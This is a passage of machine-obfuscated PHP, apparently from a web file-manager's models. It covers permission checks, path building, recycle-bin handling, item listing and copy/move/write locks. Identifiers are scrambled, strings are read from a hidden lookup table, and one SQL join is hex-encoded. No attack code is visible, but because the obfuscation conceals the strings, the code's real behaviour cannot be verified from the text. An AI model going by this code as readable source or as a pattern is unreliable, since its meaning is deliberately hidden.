$ÀÇ®¸Ñ[$¨Ëª¸Œä[236]] = AuthModel::authCheckEdit($ÀÇ®¸Ñ[$¨Ëª¸Œä[489]][$¨Ëª¸Œä[490]]); $ÀÇ®¸Ñ[$¨Ëª¸Œä[235]] = AuthModel::authCheckView($ÀÇ®¸Ñ[$¨Ëª¸Œä[489]][$¨Ëª¸Œä[490]]); } $this->groupPathDisplay($ÀÇ®¸Ñ); } unset($ÀÇ®¸Ñ); } public function _listAppendAuthSecret(&$ã‚ØÉ’ä) { $òó³™ôË =& $_SERVER[¯‘·½]; if (Model($òó³™ôË[510])->get($òó³™ôË[574]) != $òó³™ôË[91]) { return; } static $ùíËºŸ = false; if (!$ùíËºŸ) { $ü¬…íå = Model($òó³™ôË[575]); $‹´Ï· = Model($òó³™ôË[576]); $ùíËºŸ = $‹´Ï·->listData(); $ùíËºŸ = array_to_keyvalue($ùíËºŸ, $òó³™ôË[194]); $“¬Ş¶´‹ = json_decode(Model($òó³™ôË[510])->get($òó³™ôË[577]), !0); $“¬Ş¶´‹ = array_to_keyvalue($“¬Ş¶´‹, $òó³™ôË[477]); foreach ($ùíËºŸ as $¿¤ÊùãŸ => $ÍÊ€Í¬ò) { $ˆ½ë”Ëà = $“¬Ş¶´‹[$ÍÊ€Í¬ò[$òó³™ôË[578]]]; if (!$ˆ½ë”Ëà) { $‹´Ï·->remove($ÍÊ€Í¬ò[$òó³™ôË[477]]); unset($ùíËºŸ[$¿¤ÊùãŸ]); continue; } $¤¤«˜ÒÃ = $ü¬…íå->listData($ˆ½ë”Ëà[$òó³™ôË[489]]); if (!$¤¤«˜ÒÃ) { $‹´Ï·->remove($ÍÊ€Í¬ò[$òó³™ôË[477]]); unset($ùíËºŸ[$¿¤ÊùãŸ]); continue; } $ÍÊ€Í¬ò[$òó³™ôË[489]] = $¤¤«˜ÒÃ; $ÍÊ€Í¬ò[$òó³™ôË[579]] = $ˆ½ë”Ëà; $ÍÊ€Í¬ò[$òó³™ôË[580]] = Model($òó³™ôË[581])->getInfoSimpleOuter($ÍÊ€Í¬ò[$òó³™ôË[529]]); $ùíËºŸ[$¿¤ÊùãŸ] = $ÍÊ€Í¬ò; } } $ñÒ¹Ÿø = USER_ID; $ÏâÄ§Åö = array(); $‚ÀÄøÀñ = $this->_listAppendPath($ÏâÄ§Åö, !0); foreach ($ã‚ØÉ’ä as $¿¤ÊùãŸ => &$ÍÊ€Í¬ò) { if (!is_array($ÍÊ€Í¬ò[$òó³™ôË[489]])) { continue; } if ($ÍÊ€Í¬ò[$òó³™ôË[191]] != $òó³™ôË[582]) { continue; } if (isset($ùíËºŸ[$ÍÊ€Í¬ò[$òó³™ôË[194]]])) { $ĞßŸ™óÆ = $ùíËºŸ[$ÍÊ€Í¬ò[$òó³™ôË[194]]]; if (!is_array($ÍÊ€Í¬ò[$òó³™ôË[543]])) { $ÍÊ€Í¬ò[$òó³™ôË[543]] = array(); } $ÍÊ€Í¬ò[$òó³™ôË[543]][$òó³™ôË[583]] = $ĞßŸ™óÆ[$òó³™ôË[578]]; $ÍÊ€Í¬ò[$òó³™ôË[489]][$òó³™ôË[584]] = $ĞßŸ™óÆ; $ÍÊ€Í¬ò[$òó³™ôË[489]][$òó³™ôË[585]] = $ÍÊ€Í¬ò[$òó³™ôË[586]]; $ÍÊ€Í¬ò[$òó³™ôË[489]][$òó³™ôË[587]] = $òó³™ôË[91]; if ($ĞßŸ™óÆ[$òó³™ôË[529]] != $ñÒ¹Ÿø) { $ÍÊ€Í¬ò[$òó³™ôË[489]][$òó³™ôË[490]] = $ÍÊ€Í¬ò[$òó³™ôË[489]][$òó³™ôË[490]] & $ĞßŸ™óÆ[$òó³™ôË[489]][$òó³™ôË[489]]; } continue; } $É·±ÙÑİ = $this->parentLevelArray($ÍÊ€Í¬ò[$òó³™ôË[588]]); $ùøÖéü‡ = array_reverse($É·±ÙÑİ); foreach ($ùøÖéü‡ as $äÉ‹ÄÙ­ => $™‰ËòŒ¤) { if (!isset($ùíËºŸ[$™‰ËòŒ¤])) { continue; } $ĞßŸ™óÆ = $ùíËºŸ[$™‰ËòŒ¤]; $ÍÊ€Í¬ò[$òó³™ôË[489]][$òó³™ôË[584]] = $ĞßŸ™óÆ; if ($ĞßŸ™óÆ[$òó³™ôË[529]] != $ñÒ¹Ÿø) { $ÍÊ€Í¬ò[$òó³™ôË[489]][$òó³™ôË[490]] = $ÍÊ€Í¬ò[$òó³™ôË[489]][$òó³™ôË[490]] & $ĞßŸ™óÆ[$òó³™ôË[489]][$òó³™ôË[489]]; } $ğÄ˜×ı = $òó³™ôË[12]; $„Û—¦¾µ = count($É·±ÙÑİ) - $äÉ‹ÄÙ­; for ($€Ö¾€íË = 0; $€Ö¾€íË < $„Û—¦¾µ; $€Ö¾€íË++) { if (!isset($‚ÀÄøÀñ[$É·±ÙÑİ[$€Ö¾€íË]])) { $ğÄ˜×ı = $òó³™ôË[12]; break; } $ğÄ˜×ı = $ğÄ˜×ı . rtrim($‚ÀÄøÀñ[$É·±ÙÑİ[$€Ö¾€íË]], $òó³™ôË[8]) . $òó³™ôË[8]; } $ÍÊ€Í¬ò[$òó³™ôË[489]][$òó³™ôË[585]] = rtrim($ğÄ˜×ı, $òó³™ôË[8]) . $òó³™ôË[8]; break; } } unset($ÍÊ€Í¬ò); } public function groupPathDisplay(&$›¯îáşÃ) { $Ë•ÒÌ¶ş =& $_SERVER[¯‘·½]; if ($›¯îáşÃ[$Ë•ÒÌ¶ş[191]] != self::TYPE_GROUP) { return; } $Šã¬½ Ó = Model($Ë•ÒÌ¶ş[589])->getInfo($›¯îáşÃ[$Ë•ÒÌ¶ş[573]]); $‘Š“èêÃ = $this->parentLevelArray($Šã¬½ Ó[$Ë•ÒÌ¶ş[588]]); $×øƒŠ‚  = $Ë•ÒÌ¶ş[12]; foreach ($‘Š“èêÃ as $†Ó¿ıüé) { $ğ…š ËÚ = Model($Ë•ÒÌ¶ş[589])->getInfo($†Ó¿ıüé); $×øƒŠ‚  .= $ğ…š ËÚ[$Ë•ÒÌ¶ş[90]][$Ë•ÒÌ¶ş[194]] . $Ë•ÒÌ¶ş[50]; } $›¯îáşÃ[$Ë•ÒÌ¶ş[590]] = $Šã¬½ Ó[$Ë•ÒÌ¶ş[193]]; $›¯îáşÃ[$Ë•ÒÌ¶ş[591]] = $Šã¬½ Ó[$Ë•ÒÌ¶ş[588]]; $›¯îáşÃ[$Ë•ÒÌ¶ş[592]] = $Šã¬½ Ó[$Ë•ÒÌ¶ş[593]]; $›¯îáşÃ[$Ë•ÒÌ¶ş[594]] = $×øƒŠ‚  . $Šã¬½ Ó[$Ë•ÒÌ¶ş[90]][$Ë•ÒÌ¶ş[194]]; } protected function _listAppendPath(&$Š¯ê­¬Ù, $Ó‡’İõ = false) { $Öû®” =& $_SERVER[¯‘·½]; static $£¦›Şß¬ = array(); $¿ñ š‡· = array(); $¼ É‘›Ñ = array(); if ($Ó‡’İõ) { return $£¦›Şß¬; } foreach ($Š¯ê­¬Ù as &$Ó¥¸åïË) { $ûşêÉí = $Ó¥¸åïË[$Öû®”[194]]; if ($Ó¥¸åïË[$Öû®”[487]] == $Öû®”[91] && $Ó¥¸åïË[$Öû®”[193]] != 0) { $£¦›Şß¬[$ûşêÉí] = $Ó¥¸åïË[$Öû®”[32]]; } if ($Ó¥¸åïË[$Öû®”[487]] == $Öû®”[91] && $Ó¥¸åïË[$Öû®”[193]] == 0) { $£¦›Şß¬[$ûşêÉí] = $this->_listAppendPathRoot($Ó¥¸åïË, array()); } if (isset($¼ É‘›Ñ[$Ó¥¸åïË[$Öû®”[588]]])) { continue; } $¼ É‘›Ñ[$Ó¥¸åïË[$Öû®”[588]]] = !0; $è¢åˆÑ = $this->parentLevelArray($Ó¥¸åïË[$Öû®”[588]]); foreach ($è¢åˆÑ as $ë¡§ƒôŞ => $Ù¸Ø…ÆÆ) { if (isset($£¦›Şß¬[$Ù¸Ø…ÆÆ])) { continue; } if ($ë¡§ƒôŞ == 0) { $£¦›Şß¬[$Ù¸Ø…ÆÆ] = $this->_listAppendPathRoot($Ó¥¸åïË, $è¢åˆÑ); } if ($ë¡§ƒôŞ != 0) { $¿ñ š‡·[] = $Ù¸Ø…ÆÆ; } } } unset($Ó¥¸åïË); $¿ñ š‡· = array_unique($¿ñ š‡·); if (count($¿ñ š‡·) > 0) { $Á¶Æ×†Ô = array($Öû®”[493] => array($Öû®”[494], $¿ñ š‡·)); if (count($¿ñ š‡·) == 1) { $Å±ÆÙª» = $this->sourceInfo($¿ñ š‡·[0]); $§–ª«¼° = is_array($Å±ÆÙª») ? array($Å±ÆÙª») : !1; } else { $§–ª«¼° = $this->field($Öû®”[595])->where($Á¶Æ×†Ô)->select(); } if (!$§–ª«¼°) { $§–ª«¼° = array(); } foreach ($§–ª«¼° as $™ÃÄ±°Ê) { $£¦›Şß¬[$™ÃÄ±°Ê[$Öû®”[194]]] = $™ÃÄ±°Ê[$Öû®”[32]]; } } $¿İ›‹†è = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $±ëÔó„ï = array(); foreach ($Š¯ê­¬Ù as &$Ó¥¸åïË) { $‹³áçŞó = $Ó¥¸åïË[$Öû®”[588]]; $ŸÆ¶ºğ = $Öû®”[12]; if (isset($±ëÔó„ï[$‹³áçŞó])) { $ŸÆ¶ºğ = $±ëÔó„ï[$‹³áçŞó]; } else { $è¢åˆÑ = $this->parentLevelArray($Ó¥¸åïË[$Öû®”[588]]); foreach ($è¢åˆÑ as $ë¡§ƒôŞ => $Ù¸Ø…ÆÆ) { if (isset($£¦›Şß¬[$Ù¸Ø…ÆÆ])) { $ŸÆ¶ºğ .= $£¦›Şß¬[$Ù¸Ø…ÆÆ] . $Öû®”[8]; } } $±ëÔó„ï[$‹³áçŞó] = $ŸÆ¶ºğ; } $ŸÆ¶ºğ .= $Ó¥¸åïË[$Öû®”[32]]; if ($Ó¥¸åïË[$Öû®”[487]] == $Öû®”[91]) { $ŸÆ¶ºğ .= $Öû®”[8]; } $Ó¥¸åïË[$Öû®”[586]] = str_replace($Öû®”[257], $Öû®”[8], $ŸÆ¶ºğ); if ($Ó¥¸åïË[$Öû®”[193]] == $Öû®”[231]) { $Ó¥¸åïË[$Öû®”[32]] = trim($£¦›Şß¬[$Ó¥¸åïË[$Öû®”[194]]], $Öû®”[8]); $Ó¥¸åïË[$Öû®”[586]] = $Ó¥¸åïË[$Öû®”[32]] . $Öû®”[8]; } if (intval($Ó¥¸åïË[$Öû®”[191]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Ó¥¸åïË, $è¢åˆÑ, $¿İ›‹†è); } } unset($Ó¥¸åïË); return $Š¯ê­¬Ù; } private function _listAppendPathRecycle(&$Ë·™®å, $üÂÚóëÚ, $ºĞşØÜ) { $Œ‰ ¦¹å =& $_SERVER[¯‘·½]; if (!in_array($ºĞşØÜ, $üÂÚóëÚ) && $Ë·™®å[$Œ‰ ¦¹å[194]] != $ºĞşØÜ) { return; } $µ°Ğô‹ = explode($Œ‰ ¦¹å[8], trim($Ë·™®å[$Œ‰ ¦¹å[586]], $Œ‰ ¦¹å[8])); $•€Ììã¤ = implode($Œ‰ ¦¹å[8], array_slice($µ°Ğô‹, 2)); $Ë·™®å[$Œ‰ ¦¹å[586]] = $Œ‰ ¦¹å[8] . LNG($Œ‰ ¦¹å[596]) . $Œ‰ ¦¹å[8] . ltrim($•€Ììã¤, $Œ‰ ¦¹å[8]); $Ë·™®å[$Œ‰ ¦¹å[588]] = $Œ‰ ¦¹å[597] . implode($Œ‰ ¦¹å[50], array_slice($üÂÚóëÚ, 1)) . $Œ‰ ¦¹å[50]; if ($Ë·™®å[$Œ‰ ¦¹å[194]] == $ºĞşØÜ) { $Ë·™®å[$Œ‰ ¦¹å[588]] = $Œ‰ ¦¹å[597]; $Ë·™®å[$Œ‰ ¦¹å[193]] = $Œ‰ ¦¹å[231]; $Ë·™®å[$Œ‰ ¦¹å[32]] = LNG($Œ‰ ¦¹å[596]); } $Ë·™®å[$Œ‰ ¦¹å[598]] = $Œ‰ ¦¹å[599]; } protected function _listAppendPathRoot(&$¶›¼Ìßƒ, $­ıŞ’©Ú) { $ù×ÛšşŞ =& $_SERVER[¯‘·½]; static $«á£×ÎÑ = false; static $êü†®‘ = false; $÷É”Åº = $ù×ÛšşŞ[12]; if ($¶›¼Ìßƒ[$ù×ÛšşŞ[191]] == self::TYPE_USER) { if ($¶›¼Ìßƒ[$ù×ÛšşŞ[573]] == USER_ID) { $÷É”Åº = LNG($ù×ÛšşŞ[600]); if ($«á£×ÎÑ === !1) { $êêÑß¯– = Model($ù×ÛšşŞ[601])->getInfoFull(USER_ID); $«á£×ÎÑ = _get($êêÑß¯–, $ù×ÛšşŞ[602], $ù×ÛšşŞ[12]); } if ($êü†®‘ === !1) { $êêÑß¯– = Model($ù×ÛšşŞ[601])->getInfoFull(USER_ID); $êü†®‘ = _get($êêÑß¯–, $ù×ÛšşŞ[603], $ù×ÛšşŞ[12]); } if ($­ıŞ’©Ú && $­ıŞ’©Ú[0] == $«á£×ÎÑ || !$­ıŞ’©Ú && $¶›¼Ìßƒ[$ù×ÛšşŞ[194]] == $«á£×ÎÑ) { $÷É”Åº = LNG($ù×ÛšşŞ[604]); $¶›¼Ìßƒ[$ù×ÛšşŞ[605]] = $ù×ÛšşŞ[606]; } if ($­ıŞ’©Ú && $­ıŞ’©Ú[0] == $êü†®‘ || !$­ıŞ’©Ú && $¶›¼Ìßƒ[$ù×ÛšşŞ[194]] == $êü†®‘) { $÷É”Åº = $÷É”Åº . $ù×ÛšşŞ[607] . LNG($ù×ÛšşŞ[608]); } if (!$­ıŞ’©Ú) { $¶›¼Ìßƒ[$ù×ÛšşŞ[32]] = $÷É”Åº; } } else { $êêÑß¯– = Model($ù×ÛšşŞ[601])->getInfoFull($¶›¼Ìßƒ[$ù×ÛšşŞ[573]]); $†ÁÄ¯ë = _get($êêÑß¯–, $ù×ÛšşŞ[603], $ù×ÛšşŞ[12]); $¶›¼Ìßƒ[$ù×ÛšşŞ[609]] = Model($ù×ÛšşŞ[581])->getInfoSimpleOuter($¶›¼Ìßƒ[$ù×ÛšşŞ[573]]); $÷É”Åº = LNG($ù×ÛšşŞ[610]) . $ù×ÛšşŞ[176] . $¶›¼Ìßƒ[$ù×ÛšşŞ[609]][$ù×ÛšşŞ[32]] . $ù×ÛšşŞ[178]; if ($­ıŞ’©Ú && $­ıŞ’©Ú[0] == $†ÁÄ¯ë || !$­ıŞ’©Ú && $¶›¼Ìßƒ[$ù×ÛšşŞ[194]] == $†ÁÄ¯ë) { $÷É”Åº = LNG($ù×ÛšşŞ[610]) . $ù×ÛšşŞ[611] . $¶›¼Ìßƒ[$ù×ÛšşŞ[609]][$ù×ÛšşŞ[32]] . $ù×ÛšşŞ[607] . LNG($ù×ÛšşŞ[608]) . $ù×ÛšşŞ[178]; } } } else { if ($¶›¼Ìßƒ[$ù×ÛšşŞ[191]] == self::TYPE_GROUP) { $Óê£ˆ = Model($ù×ÛšşŞ[589])->getInfoSimple($¶›¼Ìßƒ[$ù×ÛšşŞ[573]]); $÷É”Åº = $Óê£ˆ[$ù×ÛšşŞ[32]]; } else { if ($¶›¼Ìßƒ[$ù×ÛšşŞ[191]] == self::TYPE_SYSTEM) { $÷É”Åº = $ù×ÛšşŞ[612]; } } } $÷É”Åº = $÷É”Åº ? $ù×ÛšşŞ[8] . $÷É”Åº . $ù×ÛšşŞ[8] : $ù×ÛšşŞ[8]; return $÷É”Åº; } protected function _listAppendUser(&$„Îõ«ôá) { $Ø¦ÉİÓ =& $_SERVER[¯‘·½]; $ôÛÃĞˆ = array_to_keyvalue($„Îõ«ôá, $Ø¦ÉİÓ[12], $Ø¦ÉİÓ[529]); $­Şñ¬Ì­ = array_to_keyvalue($„Îõ«ôá, $Ø¦ÉİÓ[12], $Ø¦ÉİÓ[531]); $ë‘Ûõ¦ = array_merge($ôÛÃĞˆ, $­Şñ¬Ì­); $ßØËï Ü = Model($Ø¦ÉİÓ[601])->userListInfo($ë‘Ûõ¦); foreach ($„Îõ«ôá as &$«Œõ¨ƒƒ) { $æô¸¹òš = $«Œõ¨ƒƒ[$Ø¦ÉİÓ[529]]; $«Œõ¨ƒƒ[$Ø¦ÉİÓ[529]] = $ßØËï Ü[$æô¸¹òš] ? $ßØËï Ü[$æô¸¹òš] : !1; $æô¸¹òš = $«Œõ¨ƒƒ[$Ø¦ÉİÓ[531]]; $«Œõ¨ƒƒ[$Ø¦ÉİÓ[531]] = $ßØËï Ü[$æô¸¹òš] ? $ßØËï Ü[$æô¸¹òš] : !1; if (_get($«Œõ¨ƒƒ, $Ø¦ÉİÓ[613], 0)) { $Êˆš¹ä = $GLOBALS[$Ø¦ÉİÓ[6]][$Ø¦ÉİÓ[92]][$Ø¦ÉİÓ[614]]; if ($«Œõ¨ƒƒ[$Ø¦ÉİÓ[543]][$Ø¦ÉİÓ[615]] <= time() - $Êˆš¹ä) { $this->metaSet($«Œõ¨ƒƒ[$Ø¦ÉİÓ[194]], $Ø¦ÉİÓ[616], null); $this->metaSet($«Œõ¨ƒƒ[$Ø¦ÉİÓ[194]], $Ø¦ÉİÓ[615], null); unset($«Œõ¨ƒƒ[$Ø¦ÉİÓ[543]][$Ø¦ÉİÓ[616]]); continue; } $ÂçÔªèÈ = $«Œõ¨ƒƒ[$Ø¦ÉİÓ[543]][$Ø¦ÉİÓ[616]]; $«Œõ¨ƒƒ[$Ø¦ÉİÓ[543]][$Ø¦ÉİÓ[617]] = Model($Ø¦ÉİÓ[601])->getInfoSimpleOuter($ÂçÔªèÈ); } } unset($«Œõ¨ƒƒ); } public function parentLevelArray($™¼âıö†) { $ºøŸüí¹ =& $_SERVER[¯‘·½]; $™¼âıö† = explode($ºøŸüí¹[50], trim($™¼âıö†, $ºøŸüí¹[50])); return array_to_int(array_filter($™¼âıö†)); } public function listAll($¦§ïåã×) { $õùÜ»¹Ş =& $_SERVER[¯‘·½]; $éÛª¤¼ = $this->sourceInfo($¦§ïåã×); $œÚ¹ÅÛí = array($õùÜ»¹Ş[618] => array($õùÜ»¹Ş[619], $éÛª¤¼[$õùÜ»¹Ş[588]] . $¦§ïåã× . $õùÜ»¹Ş[620]), $õùÜ»¹Ş[621] => 0); $¿¿öÛñ = $õùÜ»¹Ş[622]; $µëÃ”ó» = "\x4c\105\x46\124\40\x4a\x4f\x49\116\x20{$this->tablePrefix}\151\157\137\146\151\x6c\x65\x20\x66\x69\x6c\145\x20\157\x6e\x20\x73\157\165\x72\x63\x65\x2e\x66\x69\154\x65\111\x44\40\75\40\x66\x69\x6c\145\x2e\146\151\154\x65\x49\104"; $İéÛ” = $this->alias($õùÜ»¹Ş[521])->field($¿¿öÛñ)->where($œÚ¹ÅÛí)->join($µëÃ”ó»)->select(); $this->_listAppendAuth($İéÛ”); $this->_listAppendUser($İéÛ”); $this->_listAppendPath($İéÛ”); $İéÛ” = array_to_keyvalue($İéÛ”, $õùÜ»¹Ş[194]); $Ÿ¿şøÇÇ = "\57{$éÛª¤¼[$õùÜ»¹Ş[32]]}\57"; $Ÿ¿şøÇÇ = $Ÿ¿şøÇÇ == $õùÜ»¹Ş[257] ? $õùÜ»¹Ş[8] : $Ÿ¿şøÇÇ; $±ÎŠçØ = array(); foreach ($İéÛ” as $ÅÄæ†¼¢ => $Š¤î·®¸) { $Ğ€¶îº“ = $this->parentLevelArray($Š¤î·®¸[$õùÜ»¹Ş[588]]); array_shift($Ğ€¶îº“); $ÇšÙ¿íº = $Ÿ¿şøÇÇ; for ($ùÎ²ˆĞ¢ = 0; $ùÎ²ˆĞ¢ < count($Ğ€¶îº“); $ùÎ²ˆĞ¢++) { $ÇšÙ¿íº .= $İéÛ”[$Ğ€¶îº“[$ùÎ²ˆĞ¢]][$õùÜ»¹Ş[32]] . $õùÜ»¹Ş[8]; } $ÇšÙ¿íº .= $Š¤î·®¸[$õùÜ»¹Ş[32]]; if ($Š¤î·®¸[$õùÜ»¹Ş[487]]) { $ÇšÙ¿íº .= $õùÜ»¹Ş[8]; } $ÏÑÙ—¼… = array($õùÜ»¹Ş[497] => str_replace($õùÜ»¹Ş[257], $õùÜ»¹Ş[8], str_replace($õùÜ»¹Ş[257], $õùÜ»¹Ş[8], str_replace($õùÜ»¹Ş[257], $õùÜ»¹Ş[8], $ÇšÙ¿íº))), $õùÜ»¹Ş[623] => intval($Š¤î·®¸[$õùÜ»¹Ş[487]]), $õùÜ»¹Ş[624] => intval($Š¤î·®¸[$õùÜ»¹Ş[79]]), $õùÜ»¹Ş[88] => intval($Š¤î·®¸[$õùÜ»¹Ş[88]]), $õùÜ»¹Ş[90] => $this->pathInfoFilter($Š¤î·®¸)); if (!$ÏÑÙ—¼…[$õùÜ»¹Ş[487]]) { $ÏÑÙ—¼…[$õùÜ»¹Ş[545]] = $Š¤î·®¸[$õùÜ»¹Ş[545]]; } $±ÎŠçØ[] = $ÏÑÙ—¼…; } $±ÎŠçØ = array_sort_by($±ÎŠçØ, $õùÜ»¹Ş[87]); return $±ÎŠçØ; } } goto dôåÅá”ÒŞ; dôåÅá”ÒŞ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($É×‘éÌË) { $¬ŸäÖ‰ =& $_SERVER[¯‘·½]; if (!$this->allowLock()) { return; } $this->_lockCheck($¬ŸäÖ‰[625], $É×‘éÌË); $çûÆ´ä˜ = 1; $this->_lockEvent($É×‘éÌË, array($¬ŸäÖ‰[626], $¬ŸäÖ‰[627]), $çûÆ´ä˜); $this->_lockParent($É×‘éÌË, array($¬ŸäÖ‰[627]), $çûÆ´ä˜); $this->_lockEvent($É×‘éÌË, array($¬ŸäÖ‰[628], $¬ŸäÖ‰[629]), $çûÆ´ä˜); $this->_lockCheckEnd($¬ŸäÖ‰[625], $É×‘éÌË); } public function lockCopyEnd($„ßÃ¾ı™) { $Ş¢šä¤Ñ =& $_SERVER[¯‘·½]; if (!$this->allowLock()) { return; } $˜ò×şÑ› = 0; $this->_lockEvent($„ßÃ¾ı™, array($Ş¢šä¤Ñ[626], $Ş¢šä¤Ñ[627]), $˜ò×şÑ›); $this->_lockParent($„ßÃ¾ı™, array($Ş¢šä¤Ñ[627]), $˜ò×şÑ›); $this->_lockEvent($„ßÃ¾ı™, array($Ş¢šä¤Ñ[628], $Ş¢šä¤Ñ[629]), $˜ò×şÑ›); } public function lockWriteStart($àı…¤“œ, $èûªæî = '') { $¥÷•ÈŒ =& $_SERVER[¯‘·½]; if (!$this->allowLock()) { return; } $this->_lockCheck($¥÷•ÈŒ[626], $àı…¤“œ); $ ÄøòÍ¨ = 1; $this->_lockKey($¥÷•ÈŒ[630] . $àı…¤“œ . $¥÷•ÈŒ[10] . $èûªæî, $ ÄøòÍ¨); $this->_lockEvent($àı…¤“œ, array($¥÷•ÈŒ[625], $¥÷•ÈŒ[627]), $ ÄøòÍ¨); $this->_lockParent($àı…¤“œ, array($¥÷•ÈŒ[625], $¥÷•ÈŒ[627]), $ ÄøòÍ¨); $this->_lockCheckEnd($¥÷•ÈŒ[626], $àı…¤“œ); } public function lockWriteEnd($çóÔúĞÛ, $È»È’ É = '') { $ÊòŒ ò± =& $_SERVER[¯‘·½]; if (!$this->allowLock()) { return; } $”Çº¬Î = 0; $this->_lockKey($ÊòŒ ò±[630] . $çóÔúĞÛ . $ÊòŒ ò±[10] . $È»È’ É, $”Çº¬Î); $this->_lockEvent($çóÔúĞÛ, array($ÊòŒ ò±[625], $ÊòŒ ò±[627]), $”Çº¬Î); $this->_lockParent($çóÔúĞÛ, array($ÊòŒ ò±[625], $ÊòŒ ò±[627]), $”Çº¬Î); } public function lockMoveStart($á÷áÎÉ¬) { $ßŒô€ =& $_SERVER[¯‘·½]; if (!$this->allowLock()) { return; } $this->_lockCheck($ßŒô€[627], $á÷áÎÉ¬); $úß ºß = 1; $this->_lockKey($ßŒô€[631] . $á÷áÎÉ¬, $úß ºß); $this->_lockEvent($á÷áÎÉ¬, array($ßŒô€[625], $ßŒô€[626]), $úß ºß); $this->_lockParent($á÷áÎÉ¬, array($ßŒô€[625], $ßŒô€[627]), $úß ºß); $this->_lockEvent($á÷áÎÉ¬, array($ßŒô€[632], $ßŒô€[628], $ßŒô€[629]), $úß ºß); $this->_lockCheckEnd($ßŒô€[627], $á÷áÎÉ¬); } public function lockMoveEnd($¥“¡ÕÅ) { $Úù€©¼  =& $_SERVER[¯‘·½]; if (!$this->allowLock()) { return; } $÷İÇ ã = 0; $this->_lockKey($Úù€©¼ [631] . $¥“¡ÕÅ, $÷İÇ ã); $this->_lockEvent($¥“¡ÕÅ, array($Úù€©¼ [625], $Úù€©¼ [626]), $÷İÇ ã); $this->_lockParent($¥“¡ÕÅ, array($Úù€©¼ [625], $Úù€©¼ [627]), $÷İÇ ã); $this->_lockEvent($¥“¡ÕÅ, array($Úù€©¼ [632], $Úù€©¼ [628], $Úù€©¼ [629]), $÷İÇ ã); } private function _lockCheck($ÆÛëä¸Ã, $úõÏî®) { $ÍãàïÁ« =& $_SERVER[¯‘·½]; $áÎñøÛ = $this->sourceInfo($úõÏî®); $íÉ¿§€Ÿ = $ÆÛëä¸Ã . $ÍãàïÁ«[10] . $úõÏî®; $this->_lockTimeStart[$íÉ¿§€Ÿ] = timeFloat(); if (!is_array($áÎñøÛ)) { return; } $€ÊöŠÖ² = LNG($ÍãàïÁ«[633]); CacheLock::setErrorMsg($ÍãàïÁ«[176] . htmlspecialchars($áÎñøÛ[$ÍãàïÁ«[32]]) . $ÍãàïÁ«[178] . $€ÊöŠÖ²); $this->_lockKey($íÉ¿§€Ÿ, 1); $this->_lockKey($íÉ¿§€Ÿ, 0); $œúŸ†›˜ = array_reverse($this->parentLevelArray($áÎñøÛ[$ÍãàïÁ«[588]])); foreach ($œúŸ†›˜ as $©í³ˆ«Ü) { $íÉ¿§€Ÿ = $ÆÛëä¸Ã . $ÍãàïÁ«[634] . $©í³ˆ«Ü; if (CacheLock::lockGet($ÍãàïÁ«[635] . $íÉ¿§€Ÿ)) { $áÎñøÛ = $this->sourceInfo($©í³ˆ«Ü); CacheLock::setErrorMsg($ÍãàïÁ«[176] . htmlspecialchars($áÎñøÛ[$ÍãàïÁ«[32]]) . $ÍãàïÁ«[178] . $€ÊöŠÖ²); $this->_lockKey($íÉ¿§€Ÿ, 1); $this->_lockKey($íÉ¿§€Ÿ, 0); } } } private function _lockCheckEnd($íììˆ¬ğ, $†Í¥Åää) { $¤ƒ‹ĞÃ =& $_SERVER[¯‘·½]; $œİÃŠîö = $íììˆ¬ğ . $¤ƒ‹ĞÃ[10] . $†Í¥Åää; CacheLock::setErrorMsg($¤ƒ‹ĞÃ[456]); if (!isset($this->_lockTimeStart[$œİÃŠîö])) { return; } $Œœ÷¢  = timeFloat() - $this->_lockTimeStart[$œİÃŠîö]; unset($this->_lockTimeStart[$œİÃŠîö]); if ($Œœ÷¢  > 0.5) { unset(self::$cacheSourceInfo[$¤ƒ‹ĞÃ[535] . $†Í¥Åää]); } $µ” •Š™ = $this->sourceInfo($†Í¥Åää); if (!$µ” •Š™) { show_json(LNG($¤ƒ‹ĞÃ[108]), !1); } } private function _lockParent($áû±Û¤¬, $çª¦Êİ, $ë…’†¹‡) { if (!$this->autoLockSet) { return; } $õšÚÀ± = $this->sourceInfo($áû±Û¤¬); if (!is_array($õšÚÀ±)) { return; } $æ»™¢ÜÒ = array_reverse($this->parentLevelArray($õšÚÀ±[$_SERVER[¯‘·½][588]])); foreach ($æ»™¢ÜÒ as $Õá» Ùù) { $this->_lockEvent($Õá» Ùù, $çª¦Êİ, $ë…’†¹‡); } } private function _lockEvent($¬¦¾£Ğ³, $ÅÖ³Âä, $Üğ¨¸é”) { $îÂÑßà =& $_SERVER[¯‘·½]; if (!$this->autoLockSet) { return; } foreach ($ÅÖ³Âä as $Òü¿ŒÆ•) { $“ª‘˜íê = $Òü¿ŒÆ• . $îÂÑßà[10] . $¬¦¾£Ğ³; if ($Üğ¨¸é” && CacheLock::lockGet($îÂÑßà[635] . $“ª‘˜íê)) { continue; } $this->_lockKey($“ª‘˜íê, $Üğ¨¸é”); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($š±‡çÃÍ, $¨Ä²ÅÒì = 1) { $äÀ¯Äç = $_SERVER[¯‘·½][635] . md5($š±‡çÃÍ); if ($¨Ä²ÅÒì) { if (isset(self::$_lockItemArr[$äÀ¯Äç])) { return; } self::$_lockItemArr[$äÀ¯Äç] = 1; CacheLock::lock($äÀ¯Äç, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$äÀ¯Äç])) { return; } unset(self::$_lockItemArr[$äÀ¯Äç]); CacheLock::unlock($äÀ¯Äç); } } public function isParentOf($§¨˜äë…, $˜Íš) { $È£÷Å—‹ =& $_SERVER[¯‘·½]; $ğùË‰¯ó = $this->sourceInfo($§¨˜äë…); $‰¿©­¨Ú = $this->sourceInfo($˜Íš); $©ª‘Ñ§‰ = $ğùË‰¯ó[$È£÷Å—‹[588]] . $ğùË‰¯ó[$È£÷Å—‹[194]] . $È£÷Å—‹[50]; $‘¦øÕ€ = $‰¿©­¨Ú[$È£÷Å—‹[588]] . $‰¿©­¨Ú[$È£÷Å—‹[194]] . $È£÷Å—‹[50]; $Ö›ÅŞºù = strpos($‘¦øÕ€, $©ª‘Ñ§‰) === 0; return $Ö›ÅŞºù; } private $targetIsDelete = 0; public function copy($Š”ùëÈ, $„Ÿò’¿¥, $ìĞ­¹Ãœ = REPEAT_REPLACE, $ú³¼ïîÉ = '') { $ÍÇÃ“…æ =& 